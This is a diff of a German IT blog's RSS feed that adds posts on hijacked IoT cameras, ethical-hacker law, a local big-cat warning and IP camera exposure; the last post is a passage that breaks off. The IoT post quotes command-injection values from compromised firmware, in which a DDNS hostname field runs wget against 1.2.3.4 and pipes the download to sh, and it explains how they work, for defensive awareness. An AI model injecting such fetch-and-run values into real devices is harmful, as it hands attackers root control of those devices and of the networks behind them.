@@ -12,13 +12,13 @@
 	<atom:link href="https://www.kernel-error.de/feed/?format=feed&#038;amp%3Btype=rss" rel="self" type="application/rss+xml" />
 	<link>https://www.kernel-error.de</link>
 	<description>Datenhaufen zu IT und Elektronik.</description>
-	<lastBuildDate>Tue, 15 Apr 2025 08:12:15 +0000</lastBuildDate>
+	<lastBuildDate>Mon, 17 Nov 2025 13:07:08 +0000</lastBuildDate>
 	<language>de</language>
 	<sy:updatePeriod>
 	hourly	</sy:updatePeriod>
 	<sy:updateFrequency>
 	1	</sy:updateFrequency>
-	<generator>https://wordpress.org/?v=6.8.1</generator>
+	<generator>https://wordpress.org/?v=6.8.3</generator>
 
 <image>
 	<url>https://www.kernel-error.de/wp-content/uploads/2021/08/cropped-logo-1-32x32.png</url>
@@ -28,6 +28,950 @@
 	<height>32</height>
 </image> 
 	<item>
+		<title>IoT-Geräte als Einfallstor: Warum Kameras &#038; Co. häufiger kapert werden, als viele denken</title>
+		<link>https://www.kernel-error.de/2025/11/17/iot-geraete-als-einfallstor-warum-kameras-co-haeufiger-kapert-werden-als-viele-denken/</link>
+					<comments>https://www.kernel-error.de/2025/11/17/iot-geraete-als-einfallstor-warum-kameras-co-haeufiger-kapert-werden-als-viele-denken/#respond</comments>
+		
+		<dc:creator><![CDATA[kernel-error]]></dc:creator>
+		<pubDate>Mon, 17 Nov 2025 10:17:33 +0000</pubDate>
+				<category><![CDATA[Kernel-Error-Blog]]></category>
+		<category><![CDATA[Cyber Cyber]]></category>
+		<category><![CDATA[Cybersecurity]]></category>
+		<category><![CDATA[hacker]]></category>
+		<category><![CDATA[IoT]]></category>
+		<category><![CDATA[IT-Security]]></category>
+		<category><![CDATA[Security]]></category>
+		<guid isPermaLink="false">https://www.kernel-error.de/?p=3461</guid>
+
+					<description><![CDATA[Vielleicht erinnert ihr euch an meine Aussage, dass man jedem Gerät, das man mit dem Internet verbindet, mindestens so viel Vertrauen entgegenbringen sollte wie seiner Haustür. In den letzten Wochen durfte ich das wieder mehrfach sehr anschaulich erklären – direkt anhand realer Beispiele in der IT von Unternehmen oder im privaten Umfeld. Versteht mich nicht [&#8230;]]]></description>
+										<content:encoded><![CDATA[
+<p class="has-small-font-size">Vielleicht erinnert ihr euch an meine Aussage, <a href="https://www.kernel-error.de/2025/10/30/ip-kameras-risiken-portfreigaben-rtsp-http-checks/" data-type="post" data-id="3422">dass man jedem Gerät, das man mit dem Internet verbindet, mindestens so viel Vertrauen entgegenbringen sollte wie seiner Haustür</a>. In den letzten Wochen durfte ich das wieder mehrfach sehr anschaulich erklären – direkt anhand realer Beispiele in der IT von Unternehmen oder im privaten Umfeld.</p>
+
+
+<div class="wp-block-image">
+<figure class="alignleft size-large is-resized"><img fetchpriority="high" decoding="async" width="1024" height="683" src="https://www.kernel-error.de/wp-content/uploads/2025/11/IoT-1024x683.png" alt="Image of IoT Camera and IT Security" class="wp-image-3467" style="width:233px;height:auto" srcset="https://www.kernel-error.de/wp-content/uploads/2025/11/IoT-1024x683.png 1024w, https://www.kernel-error.de/wp-content/uploads/2025/11/IoT-300x200.png 300w, https://www.kernel-error.de/wp-content/uploads/2025/11/IoT-768x512.png 768w, https://www.kernel-error.de/wp-content/uploads/2025/11/IoT-676x451.png 676w, https://www.kernel-error.de/wp-content/uploads/2025/11/IoT.png 1536w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure></div>
+
+
+<p class="has-small-font-size">Versteht mich nicht falsch: Es geht mir nicht darum, mich über irgendwen lustig zu machen oder zu behaupten, dass nur Fachleute irgendetwas einrichten dürfen. Wenn jemand ein IoT-Gerät kauft – eine Überwachungskamera, ein Thermometer, eine smarte Steckdose – dann geht diese Person zurecht davon aus, dass es „funktioniert“. Und für viele bedeutet „funktionieren“ automatisch auch: Es ist grundsätzlich sicher.<br>Leider ist genau das oft nicht der Fall.</p>
+
+
+
+<h2 class="wp-block-heading has-small-font-size">IoT in der Praxis: Schnell, günstig – und sicherheitsblind</h2>
+
+
+
+<p class="has-small-font-size">Viele dieser kleinen Netzwerkgeräte basieren auf irgendeiner Form von Linux. Das ist günstig, flexibel, gut anpassbar – perfekt für Hersteller, die aus Standardmodulen schnell ein neues „Produkt“ zusammensetzen wollen. Die Funktion steht im Vordergrund, denn die sieht der Kunde sofort. Sicherheitsrelevante Details dagegen sieht niemand und sie verzögern die Entwicklung. Also bekommen sie häufig weniger Aufmerksamkeit.</p>
+
+
+
+<p class="has-small-font-size">Selbst wenn ein Hersteller alles richtig bedenkt, kann später eine neue Angriffstechnik entstehen, gegen die das Gerät keine Abwehr hat. Dann braucht es ein Firmware-Update. Das kostet Geld, Zeit – und es hilft nur, wenn man es auch einspielt.</p>
+
+
+
+<h2 class="wp-block-heading has-small-font-size">„Was soll schon passieren? Es ist doch nur eine Kamera am Mülltonnenplatz …“</h2>
+
+
+
+<p class="has-small-font-size">Viele denken:<br>Was soll&#8217;s? Wenn jemand sehen kann, wie warm es im Keller ist oder welcher Waschbär die Tonnen plündert – na und?</p>
+
+
+
+<p class="has-small-font-size">Das Problem ist nicht der Inhalt der Kamera. Das Problem ist das <em>Gerät selbst</em>.</p>
+
+
+
+<p class="has-small-font-size">IoT-Geräte werden extrem häufig missbraucht – und zwar nicht, um euch auszuspionieren, sondern um sie für fremde Zwecke einzuspannen:</p>
+
+
+
+<ul class="wp-block-list">
+<li class="has-small-font-size">als Teil eines Botnetzes</li>
+
+
+
+<li class="has-small-font-size">zum Verteilen von Malware</li>
+
+
+
+<li class="has-small-font-size">für DDoS-Angriffe</li>
+
+
+
+<li class="has-small-font-size">zum Minen von Kryptowährungen</li>
+
+
+
+<li class="has-small-font-size">oder als Einstiegspunkt ins dahinterliegende Netzwerk</li>
+</ul>
+
+
+
+<p class="has-small-font-size">Im besten Fall merkt man davon nichts – außer vielleicht einem unerklärlich langsamen Internet.<br>Im schlechtesten Fall steht plötzlich die Polizei vor der Tür, weil über die eigene IP-Adresse strafbare Downloads verteilt wurden.</p>
+
+
+
+<p class="has-small-font-size">Und bevor jemand denkt „Das ist doch konstruiert“: Nein. Das passiert. Dauerhaft. Ich sehe fast täglich Spuren solcher Übernahmen.</p>
+
+
+
+<h2 class="wp-block-heading has-small-font-size">Warum diese Geräte so leicht kompromittierbar sind</h2>
+
+
+
+<p class="has-small-font-size">Bei manchen Geräten ist ein Login – falls überhaupt vorhanden – kaum mehr als ein wackliges Gartentor im Nirgendwo. Default-Passwörter, Basic-Auth ohne HTTPS, unsichere Dienste, schlechte Update-Strategien.</p>
+
+
+<div class="wp-block-image">
+<figure class="alignleft size-full is-resized"><a href="https://www.kernel-error.de/wp-content/uploads/2025/11/compromised-asus-cctv-iot-ip-camera.png" target="_blank" rel=" noreferrer noopener"><img decoding="async" width="908" height="819" src="https://www.kernel-error.de/wp-content/uploads/2025/11/compromised-asus-cctv-iot-ip-camera.png" alt="Screenshot of an compromised asus cctv ip camera iot" class="wp-image-3470" style="width:118px;height:auto" srcset="https://www.kernel-error.de/wp-content/uploads/2025/11/compromised-asus-cctv-iot-ip-camera.png 908w, https://www.kernel-error.de/wp-content/uploads/2025/11/compromised-asus-cctv-iot-ip-camera-300x271.png 300w, https://www.kernel-error.de/wp-content/uploads/2025/11/compromised-asus-cctv-iot-ip-camera-768x693.png 768w, https://www.kernel-error.de/wp-content/uploads/2025/11/compromised-asus-cctv-iot-ip-camera-676x610.png 676w" sizes="(max-width: 908px) 100vw, 908px" /></a></figure></div>
+
+
+<p class="has-small-font-size">Ein Klassiker: <em>nicht korrekt geprüfte Eingabefelder</em>.<br>Viele Web-Interfaces akzeptieren blind alles, was man eingibt – und führen es sogar direkt als Teil eines Shell-Befehls aus.</p>
+
+
+
+<p class="has-small-font-size">Beispiel aus einer realen IoT-Kamera-Firmware:</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">ddns_DyndnsDynamic_hostname='$(wget http://1.2.3.4/x/vivo -O-|sh)'</pre>
+
+
+
+<p class="has-small-font-size">oder</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$(wget http://1.2.3.4/ipcam.zavio.sh -O- | sh)</pre>
+
+
+
+<p class="has-small-font-size">Die Zugangsdaten, die man in solchen Feldern eintragen „muss“, sind dabei oft schlicht:</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">Benutzername: meow
+Kennwort: meow</pre>
+
+
+
+<p class="has-small-font-size">Das Entscheidende ist jedoch die Konstruktion $(…).<br>Linux interpretiert das nicht als Text, sondern als auszuführendes Kommando – mit den Rechten, mit denen die DynDNS-Funktion läuft. Und das ist bei vielen Geräten immer noch root.</p>
+
+
+
+<p class="has-small-font-size">Der eigentliche Befehl ist dann:</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">wget http://1.2.3.4/vivo -O- | sh</pre>
+
+
+
+<ul class="wp-block-list">
+<li class="has-small-font-size">wget lädt eine Datei herunter</li>
+
+
+
+<li class="has-small-font-size">-O- sorgt dafür, dass der Inhalt direkt ausgegeben wird</li>
+
+
+
+<li class="has-small-font-size">das Pipe-Symbol | übergibt den Inhalt an die Shell sh</li>
+
+
+
+<li class="has-small-font-size">die Shell führt alles aus, was darin steht</li>
+</ul>
+
+
+
+<p class="has-small-font-size">Sprich: Man lädt ein beliebiges Skript aus dem Internet – und führt es sofort mit root-Rechten aus. Ohne Rückfrage. Ohne Sicherheit.</p>
+
+
+
+<p class="has-small-font-size">Und ja: Das existiert genauso in freier Wildbahn.</p>
+
+
+
+<h2 class="wp-block-heading has-small-font-size">Wenn ihr so etwas in eurer Konfiguration findet: Uff.</h2>
+
+
+
+<p class="has-small-font-size">Dann würde ich dem Gerät nicht mal mehr nach einem Reset vertrauen. Denn:</p>
+
+
+
+<ul class="wp-block-list">
+<li class="has-small-font-size">Wurde vielleicht eine manipulierte Firmware eingespielt?</li>
+
+
+
+<li class="has-small-font-size">Wurde der Bootloader verändert?</li>
+
+
+
+<li class="has-small-font-size">Wird nach jedem Neustart automatisch eine Backdoor geöffnet?</li>
+
+
+
+<li class="has-small-font-size">Gibt es überhaupt offizielle Firmware-Images zum Neu-Flashen?</li>
+</ul>
+
+
+
+<p class="has-small-font-size">Oft lautet die bittere Antwort: <strong>Nein</strong>.<br>Und dann bleibt realistisch nur: Gerät entsorgen.</p>
+
+
+
+<p class="has-small-font-size">Noch schlimmer: Der Angreifer hat damit meist vollen Zugriff auf das Netzwerk hinter dem Gerät.<br>Und IoT-Geräte speichern gerne:</p>
+
+
+
+<ul class="wp-block-list">
+<li class="has-small-font-size">WLAN-Passwörter</li>
+
+
+
+<li class="has-small-font-size">NAS-Zugangsdaten</li>
+
+
+
+<li class="has-small-font-size">SMTP-Accounts</li>
+
+
+
+<li class="has-small-font-size">API-Tokens</li>
+
+
+
+<li class="has-small-font-size">Nutzer- und Admin-Zugänge anderer Systeme</li>
+</ul>
+
+
+
+<p class="has-small-font-size">Damit kann ein Angreifer richtig Schaden anrichten.</p>
+
+
+
+<h2 class="wp-block-heading has-small-font-size">Was also tun?</h2>
+
+
+
+<p class="has-small-font-size">IoT ist nicht böse – aber oft schlecht gemacht.<br>Daher ein paar Grundregeln, die wirklich jeder beherzigen sollte:</p>
+
+
+
+<ul class="wp-block-list">
+<li class="has-small-font-size">IoT immer in ein eigenes, getrenntes Netz.</li>
+
+
+
+<li class="has-small-font-size">Kein direkter Zugriff aus dem Internet – nur wenn es wirklich sein muss und dann sauber gesichert.</li>
+
+
+
+<li class="has-small-font-size">Regelmäßig patchen, prüfen, auditieren.</li>
+
+
+
+<li class="has-small-font-size">Standardpasswörter sofort ändern.</li>
+
+
+
+<li class="has-small-font-size">Alle nicht benötigten Dienste deaktivieren.</li>
+</ul>
+
+
+
+<p class="has-small-font-size">Das ist nicht theoretisch, nicht konstruiert – das ist Alltag. Ich sehe es fast täglich.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://www.kernel-error.de/2025/11/17/iot-geraete-als-einfallstor-warum-kameras-co-haeufiger-kapert-werden-als-viele-denken/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Information der Stadt Rheinbach &#8211; Sichtung Großkatze</title>
+		<link>https://www.kernel-error.de/2025/11/12/information-der-stadt-rheinbach-sichtung-grosskatze/</link>
+					<comments>https://www.kernel-error.de/2025/11/12/information-der-stadt-rheinbach-sichtung-grosskatze/#respond</comments>
+		
+		<dc:creator><![CDATA[kernel-error]]></dc:creator>
+		<pubDate>Wed, 12 Nov 2025 16:11:37 +0000</pubDate>
+				<category><![CDATA[Kernel-Error-Blog]]></category>
+		<category><![CDATA[Großkatze]]></category>
+		<category><![CDATA[Rheinbach]]></category>
+		<category><![CDATA[Warnung]]></category>
+		<guid isPermaLink="false">https://www.kernel-error.de/?p=3457</guid>
+
+					<description><![CDATA[Ich habe grade eine E-Mail von unserem Vorsitzenden des Ortsausschusses Todenfeld &#8211; Rheinbach in meinem Postfach. Er leitet eine Warnung bezüglich einer Sichtung einer Großkatze weiter. Öhm, also&#8230; Großkatze? Ich bin mal gespannt 😀]]></description>
+										<content:encoded><![CDATA[
+<p class="has-small-font-size">Ich habe grade eine E-Mail von unserem Vorsitzenden des Ortsausschusses Todenfeld &#8211; Rheinbach in meinem Postfach. Er leitet eine Warnung bezüglich einer Sichtung einer Großkatze weiter.</p>
+
+
+
+<figure class="wp-block-image size-large"><a href="https://www.kernel-error.de/wp-content/uploads/2025/11/Stadt_Rheinbach_Grosskatze-scaled.jpg"><img decoding="async" width="728" height="1024" src="https://www.kernel-error.de/wp-content/uploads/2025/11/Stadt_Rheinbach_Grosskatze-728x1024.jpg" alt="Stadt Rheinbach informiert über mögliche Sichtung einer Großkatze bei Kalenborn in der Verbandsgemeinde Altenahr – Hinweis an Waldbesucher, vorsichtig zu sein und ungewöhnliche Tierbeobachtungen dem Ordnungsamt zu melden." class="wp-image-3458" srcset="https://www.kernel-error.de/wp-content/uploads/2025/11/Stadt_Rheinbach_Grosskatze-728x1024.jpg 728w, https://www.kernel-error.de/wp-content/uploads/2025/11/Stadt_Rheinbach_Grosskatze-213x300.jpg 213w, https://www.kernel-error.de/wp-content/uploads/2025/11/Stadt_Rheinbach_Grosskatze-768x1080.jpg 768w, https://www.kernel-error.de/wp-content/uploads/2025/11/Stadt_Rheinbach_Grosskatze-1092x1536.jpg 1092w, https://www.kernel-error.de/wp-content/uploads/2025/11/Stadt_Rheinbach_Grosskatze-1456x2048.jpg 1456w, https://www.kernel-error.de/wp-content/uploads/2025/11/Stadt_Rheinbach_Grosskatze-676x951.jpg 676w, https://www.kernel-error.de/wp-content/uploads/2025/11/Stadt_Rheinbach_Grosskatze-scaled.jpg 1820w" sizes="(max-width: 728px) 100vw, 728px" /></a></figure>
+
+
+
+<p class="has-small-font-size">Öhm, also&#8230; Großkatze? Ich bin mal gespannt <img src="https://s.w.org/images/core/emoji/16.0.1/72x72/1f600.png" alt="😀" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://www.kernel-error.de/2025/11/12/information-der-stadt-rheinbach-sichtung-grosskatze/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>BSI will Straffreiheit: Mehr Rechtssicherheit für ethische Hacker</title>
+		<link>https://www.kernel-error.de/2025/11/07/bsi-will-straffreiheit-mehr-rechtssicherheit-fuer-ethische-hacker/</link>
+					<comments>https://www.kernel-error.de/2025/11/07/bsi-will-straffreiheit-mehr-rechtssicherheit-fuer-ethische-hacker/#comments</comments>
+		
+		<dc:creator><![CDATA[kernel-error]]></dc:creator>
+		<pubDate>Fri, 07 Nov 2025 16:06:27 +0000</pubDate>
+				<category><![CDATA[Kernel-Error-Blog]]></category>
+		<category><![CDATA[BSI]]></category>
+		<category><![CDATA[etische hacker]]></category>
+		<category><![CDATA[hacker]]></category>
+		<category><![CDATA[Security]]></category>
+		<guid isPermaLink="false">https://www.kernel-error.de/?p=3451</guid>
+
+					<description><![CDATA[Wir leben in Deutschland ja ein bisschen im „Anzeige-ist-raus“-Land. Das merken auch Security-Researcher und ethische Hacker. Solange man Eigentümer:innen/Betreiber:innen nur auf frei und offen erreichbare Probleme hinweist, ist die Welt halbwegs in Ordnung. Sobald man aber beginnt, Schutzmechanismen zu überwinden oder Anwendungen zu übervorteilen, wird’s schnell juristisch dünn. Genau deshalb melde ich in der Regel [&#8230;]]]></description>
+										<content:encoded><![CDATA[<div class="wp-block-image">
+<figure class="alignleft size-large is-resized"><img loading="lazy" decoding="async" width="1024" height="683" src="https://www.kernel-error.de/wp-content/uploads/2025/11/hacker-rechtssicher-1024x683.png" alt="free ethical hackers" class="wp-image-3454" style="width:193px;height:auto" srcset="https://www.kernel-error.de/wp-content/uploads/2025/11/hacker-rechtssicher-1024x683.png 1024w, https://www.kernel-error.de/wp-content/uploads/2025/11/hacker-rechtssicher-300x200.png 300w, https://www.kernel-error.de/wp-content/uploads/2025/11/hacker-rechtssicher-768x512.png 768w, https://www.kernel-error.de/wp-content/uploads/2025/11/hacker-rechtssicher-676x451.png 676w, https://www.kernel-error.de/wp-content/uploads/2025/11/hacker-rechtssicher.png 1536w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /></figure></div>
+
+
+<p class="has-small-font-size">Wir leben in Deutschland ja ein bisschen im „<em>Anzeige-ist-raus</em>“-Land. Das merken auch Security-Researcher und ethische Hacker. Solange man Eigentümer:innen/Betreiber:innen nur auf frei und offen erreichbare Probleme hinweist, ist die Welt halbwegs in Ordnung. Sobald man aber beginnt, Schutzmechanismen zu überwinden oder Anwendungen zu übervorteilen, wird’s schnell juristisch dünn. Genau deshalb melde ich in der Regel nur komplett offen erreichbare Dinge – außer es gibt eine security.txt mit klarer Policy oder ein offenes Bug-Bounty mit Safe-Harbor.</p>
+
+
+<div class="wp-block-image">
+<figure class="alignright size-full is-resized"><a href="https://www.kernel-error.de/wp-content/uploads/2025/11/useless-gate.png"><img loading="lazy" decoding="async" width="1024" height="1024" src="https://www.kernel-error.de/wp-content/uploads/2025/11/useless-gate.png" alt="Picture of an useless gate." class="wp-image-3452" style="width:196px;height:auto" srcset="https://www.kernel-error.de/wp-content/uploads/2025/11/useless-gate.png 1024w, https://www.kernel-error.de/wp-content/uploads/2025/11/useless-gate-300x300.png 300w, https://www.kernel-error.de/wp-content/uploads/2025/11/useless-gate-150x150.png 150w, https://www.kernel-error.de/wp-content/uploads/2025/11/useless-gate-768x768.png 768w, https://www.kernel-error.de/wp-content/uploads/2025/11/useless-gate-676x676.png 676w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /></a></figure></div>
+
+
+<p class="has-small-font-size">Ein „Schutzmechanismus“ kann schon eine simple Basic-Auth sein. Kennt ihr dieses Bild vom Gartentor mitten auf dem Weg? Kein Zaun, keine Mauer, nur ein Tor. Auf dem Weg geht’s nicht weiter – aber einen Schritt nach links über die Wiese, und zack, ums Tor herum. Juristisch blöd: Das Umgehen dieses „Törchens“ kann bereits als Überwinden einer Zugangssicherung gewertet werden. Für die Meldenden kann das zum Problem werden, obwohl sie eigentlich helfen wollen.</p>
+
+
+
+<p class="has-small-font-size">Die Konsequenz: Selbst krasse Lücken werden oft gar nicht gemeldet, wenn davor ein Gartentörchen steht. Leute mit schlechten Absichten gehen natürlich einfach drumherum und nutzen die Lücke – anonym und schwer nachverfolgbar. Ergebnis: Probleme bleiben länger offen, statt sie sauber zu fixen.</p>
+
+
+
+<p class="has-small-font-size">Das sieht auch das BSI so und fordert schon länger mehr Rechtssicherheit für Security-Forschung. Aktuell gibt es wieder Bewegung: <a href="https://www.heise.de/news/Hackerparagraf-BSI-Chefin-fordert-Sicherheitsforscher-Entkriminalisierung-11044176.html" data-type="link" data-id="https://www.heise.de/news/Hackerparagraf-BSI-Chefin-fordert-Sicherheitsforscher-Entkriminalisierung-11044176.html" target="_blank" rel="noreferrer noopener">BSI-Präsidentin Claudia Plattner plädiert öffentlich für eine Entkriminalisierung ethischer Hacker</a> – sinngemäß: „<a href="https://gruen-digital.de/2025/11/34522/" data-type="link" data-id="https://gruen-digital.de/2025/11/34522/" target="_blank" rel="noreferrer noopener">Wer uns vor Cyberangriffen schützt, darf dafür nicht bestraft werden.</a>“ Die letzte Bundesregierung hatte sogar schon einen Entwurf zur Anpassung des sogenannten Hackerparagrafen in der Pipeline; die neue Regierung prüft das Thema weiter.</p>
+
+
+
+<p class="has-small-font-size"><strong>Zur Einordnung, worum es geht:</strong></p>
+
+
+
+<p class="has-small-font-size"><em>Strafgesetzbuch (StGB) – § 202a Ausspähen von Daten<br>(1) Wer unbefugt sich oder einem anderen Zugang zu Daten, die nicht für ihn bestimmt und gegen unberechtigten Zugang besonders gesichert sind, unter Überwindung der Zugangssicherung verschafft, wird mit Freiheitsstrafe bis zu drei Jahren oder mit Geldstrafe bestraft.<br>(2) Daten im Sinne des Absatzes 1 sind nur solche, die elektronisch, magnetisch oder sonst nicht unmittelbar wahrnehmbar gespeichert sind oder übermittelt werden.</em></p>
+
+
+
+<p class="has-small-font-size">Das Problem ist weniger § 202a an sich als das fehlende Safe-Harbor für verantwortungsvolles Melden (Coordinated/Responsible Disclosure). Wenn schon Basic-Auth oder ein dünnes „Do-not-enter“-Schild als „Zugangssicherung“ zählt, macht das legitime Forschung riskant – und genau das will das BSI ändern. Schutz für die Guten, klare Grenzen gegen echten Missbrauch.</p>
+
+
+
+<p class="has-small-font-size">Den aktuellen Überblick fasst Golem gut zusammen; lesenswert:<br><a href="https://www.golem.de/news/hackerparagraf-bsi-chefin-fordert-straffreiheit-fuer-ethische-hacker-2511-201852.html?utm_source=chatgpt.com" target="_blank" rel="noreferrer noopener">https://www.golem.de/news/hackerparagraf-bsi-chefin-fordert-straffreiheit-fuer-ethische-hacker-2511-201852.html</a></p>
+
+
+
+<p class="has-small-font-size">Meta: Ja, ich bleibe auch künftig bei meiner Linie: Tests nur im eigenen Lab oder mit expliziter Erlaubnis. Alles andere ist nicht nur unklug, sondern schlicht rechtlich riskant.</p>
+
+
+
+<p class="has-small-font-size">Ich bleibe bei meinem Tipp für euch: Veröffentlicht eine <a href="https://de.wikipedia.org/wiki/Security.txt" data-type="link" data-id="https://de.wikipedia.org/wiki/Security.txt" target="_blank" rel="noreferrer noopener">security.txt</a>. Solltet ihr mal einen Hinweis bekommen, erinnert euch bitte daran, dass die Person gerade den größten Aufwand und das größte Risiko eingeht, um euch auf ein Problem aufmerksam zu machen. Es wäre viel einfacher, die Lücke für sich auszunutzen, zu verkaufen oder sonst wie zu missbrauchen, als den Schritt nach vorne zu gehen und euch fair zu informieren.</p>
+
+
+
+<p class="has-small-font-size">Natürlich meine ich damit nicht die Leute, die erst einmal 5.000 € „Audit-Gebühr“ sehen wollen oder beim ungefragten Pentesting eure komplette IT aus dem Verkehr schießen. Ich meine die Menschen, die euch auf dem REWE-Parkplatz freundlich darauf hinweisen, dass ihr euer Portemonnaie auf dem Autodach liegen gelassen habt.</p>
+
+
+
+<p class="has-small-font-size"><strong>Bedankt euch einfach.</strong> <img src="https://s.w.org/images/core/emoji/16.0.1/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
+
+
+
+<p></p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://www.kernel-error.de/2025/11/07/bsi-will-straffreiheit-mehr-rechtssicherheit-fuer-ethische-hacker/feed/</wfw:commentRss>
+			<slash:comments>4</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>IP-Kameras: Risiken, Portfreigaben (RTSP/HTTP) &#038; Checks</title>
+		<link>https://www.kernel-error.de/2025/10/30/ip-kameras-risiken-portfreigaben-rtsp-http-checks/</link>
+					<comments>https://www.kernel-error.de/2025/10/30/ip-kameras-risiken-portfreigaben-rtsp-http-checks/#respond</comments>
+		
+		<dc:creator><![CDATA[kernel-error]]></dc:creator>
+		<pubDate>Thu, 30 Oct 2025 08:59:05 +0000</pubDate>
+				<category><![CDATA[Kernel-Error-Blog]]></category>
+		<category><![CDATA[firewall]]></category>
+		<category><![CDATA[hacking]]></category>
+		<category><![CDATA[ip kamera]]></category>
+		<category><![CDATA[kamera]]></category>
+		<category><![CDATA[router]]></category>
+		<category><![CDATA[Security]]></category>
+		<category><![CDATA[Überwachungskamera]]></category>
+		<guid isPermaLink="false">https://www.kernel-error.de/?p=3422</guid>
+
+					<description><![CDATA[Moin, ich mag noch einmal etwas zu IP-Überwachungskameras schreiben. Ihr erinnert euch vielleicht an meinen letzten Beitrag zu diesem Thema KLICK. Dort habe ich mich speziell auf den RTSP-Port bezogen und auch https://www.shodan.io/ als Beispiel genannt. Shodan scannt unaufhörlich IPv4-Adressen (bei IPv6 wäre ein flächendeckender Scan kaum praktikabel) und stellt seine Ergebnisse öffentlich zur Verfügung. [&#8230;]]]></description>
+										<content:encoded><![CDATA[
+<p class="has-small-font-size">Moin, ich mag noch einmal etwas zu IP-Überwachungskameras schreiben. Ihr erinnert euch vielleicht an meinen letzten <a href="https://www.kernel-error.de/2025/01/20/geoguessr-im-cyber-sicherheitskontext-wie-ip-kameras-zum-risiko-werden-koennen/" data-type="post" data-id="3109" target="_blank" rel="noreferrer noopener">Beitrag zu diesem Thema KLICK</a>.</p>
+
+
+<div class="wp-block-image">
+<figure class="alignleft size-full is-resized"><img loading="lazy" decoding="async" width="1024" height="1024" src="https://www.kernel-error.de/wp-content/uploads/2025/10/ip-kameras.png" alt="article image of ip cameras" class="wp-image-3423" style="width:204px;height:auto" srcset="https://www.kernel-error.de/wp-content/uploads/2025/10/ip-kameras.png 1024w, https://www.kernel-error.de/wp-content/uploads/2025/10/ip-kameras-300x300.png 300w, https://www.kernel-error.de/wp-content/uploads/2025/10/ip-kameras-150x150.png 150w, https://www.kernel-error.de/wp-content/uploads/2025/10/ip-kameras-768x768.png 768w, https://www.kernel-error.de/wp-content/uploads/2025/10/ip-kameras-676x676.png 676w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /></figure></div>
+
+
+<p class="has-small-font-size">Dort habe ich mich speziell auf den RTSP-Port bezogen und auch <a href="https://www.shodan.io/">https://www.shodan</a><a href="https://www.shodan.io/" target="_blank" rel="noreferrer noopener">.</a><a href="https://www.shodan.io/">io/</a> als Beispiel genannt. Shodan scannt unaufhörlich IPv4-Adressen (bei IPv6 wäre ein flächendeckender Scan kaum praktikabel) und stellt seine Ergebnisse öffentlich zur Verfügung. Sicherheitsforscher — aber leider auch Menschen mit schlechten Absichten — bedienen sich solcher Dienste, um Informationen über Systeme hinter einer IPv4-Adresse zu bekommen, ganz ohne selbst groß zu scannen oder zu testen. Grob gesagt: Google für „Hacker“.</p>
+
+
+
+<p class="has-small-font-size">Dass IP-Kameras — vor allem günstige oder ältere Modelle — schnell ein Sicherheitsrisiko darstellen, habe ich schon erwähnt; wer das hier liest, weiß es in der Regel auch. Automatische Portfreigaben in Kombination mit solchen Kameras sind oft problematisch. Wenn ich über so etwas stolpere und ohne großen Aufwand den Betreiber ausfindig machen kann, versuche ich jeweils per E-Mail oder einem kurzen Anruf zu warnen. Das stößt mal auf offene Ohren, manchmal wird es komplett ignoriert (manchmal mit Abschalten des öffentlichen Zugriffs, manchmal ohne); selten kommt die Antwort „Anzeige ist raus“.</p>
+
+
+
+<p class="has-small-font-size">Kameras filmen oft sensible Bereiche, sowohl innen als auch außen. Das kann viele Probleme mit sich bringen, wenn diese Informationen einfach öffentlich zugänglich sind. Anders als bei Datei-Freigaben scheint bei Kamerastreams noch nicht die nötige Awareness vorhanden zu sein — genau deshalb informiere ich hier und weise darauf hin.</p>
+
+
+
+<p class="has-small-font-size">Es ist nicht nur der RTSP-Stream, der sich häufig per UPnP seinen Weg nach draußen „tunnelt“. Oft werden auch per DNAT / Portfreigabe / Portweiterleitung die Webinterfaces der Kameras direkt aus dem Internet erreichbar gemacht. Im schlimmsten Fall kann man also mit dem Browser direkt auf Webinterface und Stream zugreifen. Viele sichern den Zugriff mit der kameraeigenen Anmeldung — das ist schon mal ein Anfang. Leider reicht das nicht immer: Bei manchen Modellen sind Funktionen wie Snapshots oder einzelne JPEG-Endpoints weiterhin ohne Anmeldung erreichbar. Das ist auf den ersten Blick nicht sichtbar — kennt man aber die entsprechende URL, genügt ein Browseraufruf und man sieht wieder alles.</p>
+
+
+
+<p class="has-small-font-size">Deshalb gebe ich immer den Rat: Zugriff lieber hinter ein VPN legen und niemals direkt offen ins Internet. Gebt jedem Gerät und jedem Dienst, den ihr aus dem Internet erreichbar macht, mindestens so viel Vertrauen wie eurer Haustür. Und prüft regelmäßig, ob dieses Vertrauen noch gerechtfertigt ist.</p>
+
+
+
+<p class="has-small-font-size">Wer selbst prüfen möchte, ob die EIGENE Kamera trotz eingerichteter Anmeldung noch irgendwie ohne Login zugänglich ist, kann mein kurzes Python-Tool nutzen: <a href="https://github.com/Kernel-Error/cam_probe" target="_blank" rel="noreferrer noopener">https://github.com/Kernel-Error/cam_probe</a></p>
+
+
+
